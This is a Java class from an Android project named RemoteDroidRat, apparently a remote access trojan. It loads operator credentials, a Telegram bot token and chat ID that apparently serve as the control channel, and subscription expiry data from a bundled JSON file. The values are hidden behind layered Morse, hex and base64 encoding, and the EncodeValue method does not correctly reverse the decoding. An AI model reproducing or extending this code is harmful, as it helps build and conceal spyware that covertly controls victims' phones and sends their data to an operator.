package com.KaranKumar.RemoteDroidRat;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import org.json.JSONObject;
import org.json.JSONException;
import android.content.Context;
import android.util.Base64;
import java.nio.charset.StandardCharsets;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.MorseCodeConverter;
import android.util.Log;
import android.widget.Toast;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.TextHexConverter;
import com.KaranKumar.RemoteDroidRat.EncoderDecoder.base64.base64Text;

public class adminInfo {

    private String status;
    private String username;
    private String password;
    private String name;
    private String telegramName;
    private String telegarmUsername;
    private String chatId;
	private String apiToken;
	private String mobileNo;
	private String ExpiryDate, ExpiryTime, subscriptionInfo;
	private MorseCodeConverter morse = new MorseCodeConverter();
	private TextHexConverter hex = new TextHexConverter();
	private base64Text base64Text = new base64Text();

    public adminInfo(Context context) {
        try {
            if (context == null) {
                // Handle the case where context is null, log an error, or throw an exception.
                return;
            }

            // Get the InputStream for the JSON file from the assets folder
            InputStream inputStream = context.getAssets().open("adminInfo.json");

            // Check if the InputStream is not null before proceeding
            if (inputStream != null) {
                // Read the InputStream into a string
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line);
                }

                // Close the InputStream
                inputStream.close();

                // Parse the JSON string
                String jsonString = stringBuilder.toString();
                JSONObject jsonObject = new JSONObject(jsonString);

                // Access values
                status = jsonObject.getString("status");
                username = jsonObject.getString("username");
                password = jsonObject.getString("password");
                name = jsonObject.getString("name");
				mobileNo = jsonObject.getString("mobileNo");

                // Access nested values
                JSONObject telegramObject = jsonObject.getJSONObject("telegarm");
                telegramName = telegramObject.getString("telegramName");
                telegarmUsername = telegramObject.getString("telegarmUsername");
                chatId = telegramObject.getString("chatId");
				apiToken = telegramObject.getString("api_token");

				JSONObject expiryObject = jsonObject.getJSONObject("ExpiryInfo");

				ExpiryDate = expiryObject.getString("expiryDate");
				ExpiryTime = expiryObject.getString("expiryTime");
				subscriptionInfo = expiryObject.getString("subscriptionInfo");
            }


        } catch (IOException | JSONException e) {
            e.printStackTrace(); // Consider handling exceptions appropriately
        }

    }

    // Getter methods for the fields

    public String getStatus() {
        return status;
    }

    public String getUsername() {
        return DecodeValue(username);
    }

    public String getPassword() {
        return DecodeValue(password);
    }

    public String getName() {
        return DecodeValue(name);
    }

    public String getTelegramName() {
        return DecodeValue(telegramName);
    }

    public String getTelegarmUsername() {
        return DecodeValue(telegarmUsername);
    }

    public String getChatId() {
        return DecodeValue(chatId);
    }

	public String getApiToken() {

		return DecodeValue(apiToken);
	}

	public String getMobileNo() {

		return DecodeValue(mobileNo);
	}

	public String getExpiryDate() {

		return DecodeValue(ExpiryDate);
	}

	public String getExpiryTime() {

		return DecodeValue(ExpiryTime);
	}

	public String getSubscriptionInfo() {

		return DecodeValue(subscriptionInfo);
	}

	private String DecodeValue(String Text){
		return base64Text.decode(hex.hexToText(base64Text.decode(morse.MorseDecode(Text))));
	}
	
	private String EncodeValue(String Text){
		return morse.MorseEncode(base64Text.encode(hex.textToHex(base64Text.decode(Text))));
	}
}
